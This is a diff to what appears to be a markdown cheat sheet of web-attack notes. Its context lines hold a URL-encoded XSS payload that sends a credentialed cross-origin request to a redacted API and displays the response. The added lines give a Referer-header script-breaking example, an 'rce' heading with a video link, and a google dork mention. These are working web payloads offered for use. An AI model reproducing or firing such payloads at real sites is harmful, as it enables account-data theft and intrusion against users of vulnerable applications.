@@ -1140,6 +1140,10 @@ X-Forwarded-For: 1.1.1.1
 <script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.redacted.com/api/return",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
 ```
 
+-and referer example
+```
+refer:https://exam.com</script>
+```
 # the end
 
 -
@@ -1151,5 +1155,8 @@ X-Forwarded-For: 1.1.1.1
 -and google dork( pdf_path=)
 
 
+### rce
+-link 
+-[youtube](https://youtu.be/FjYZMcj30pw?feature=shared)
 
 
